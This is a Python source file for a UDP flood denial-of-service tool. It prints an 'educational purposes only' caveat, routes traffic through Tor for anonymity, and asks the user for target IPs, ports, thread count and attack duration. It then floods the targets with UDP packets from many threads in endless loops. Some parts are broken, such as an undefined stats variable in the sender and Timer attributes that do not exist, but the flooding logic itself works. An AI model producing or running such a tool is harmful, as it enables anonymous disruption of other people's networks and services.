import os
import time
import socket
import scapy.all as scapy
import random
import threading
import socks

# DDOS-Attack [ASCII Art]
def display_banner():
    banner =  """
██████╗ ██████╗  █████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝██████╔╝███████║███████╗██████╔╝
██╔══██╗██╔══██╗██╔══██║╚════██║██╔══██╗
██║  ██║██║  ██║██║  ██║███████║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
RED THE REPPER
"""
    print(banner)

# Terminal header settings and information
os.system('color 0A')
print("Developer   :   RED THE REPPER")
print("Created Date:   2024")
print('Project     :   DDOS')
print('Purpose     :   A simple DOS-Attack tool')
print('Caution     :   This tool is only for educational purposes')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Function to use Tor for routing internet traffic
def use_tor():
    # Establecer la conexión a la red Tor
    socks.set_default_proxy(socks.SOCKS5, 'localhost', 9050)
    print("Tor is now routing your internet traffic")

# Function to send packets
def send_packets(ip, port, data, proxy_size, thread_id, stats_lock):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1
        with stats_lock:
            stats[thread_id]['sent'] += sent

# Function to display statistics
def display_stats(stats, timer):
    while timer.running:
        os.system('clear' if os.name != 'nt' else 'cls')
        print("DOS Attack Statistics:")
        print("----------------------------")
        for thread_id, thread_stats in stats.items():
            print(f"Thread {thread_id}: Sent {thread_stats['sent']} packets")
        print(f"Timer: {timer.time_left:.2f} seconds")
        time.sleep(1)

# Main function
def main():
    display_banner()
    use_tor()
    
    # Get user input
    ips = input("IP Targets (separated by commas): ").split(',')
    ports = input("Ports (separated by commas): ").split(',')
    proxy_size = int(input("Proxy Size : "))
    threads = int(input("Number of threads : "))
    timer_duration = int(input("Attack duration (in seconds, max 600): "))

    # Validate timer duration
    if timer_duration > 600:
        print("Attack duration cannot exceed 10 minutes (600 seconds)")
        return

    # Initialize statistics
    stats = {i: {'sent': 0} for i in range(threads)}
    stats_lock = threading.Lock()

    # Start the attack
    print("Thank you for using  (DDOS-Attack tool)")
    time.sleep(3)
    for ip in ips:
        for port in ports:
            # Use a bytes literal to create the data
            data = b'Hello, this is a DDOS attack'
            print("Starting the attack on ", ip, " at port ", port)
            timer = threading.Timer(timer_duration, lambda: print("Attack finished"))
            timer.start()
            display_stats_thread = threading.Thread(target=display_stats, args=(stats, timer))
            display_stats_thread.daemon = True
            display_stats_thread.start()
            for i in range(threads):
                t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size, i, stats_lock))
                t.start()
                time.sleep(0.1)  # Avoid overwhelming the system with too many threads

    # Keep the terminal clean
    if os.name == "nt": # Windows
        os.system("cls")
    else: # Linux or Mac
        os.system("clear")
    input("Press Enter to exit...")

if __name__ == "__main__":
     main()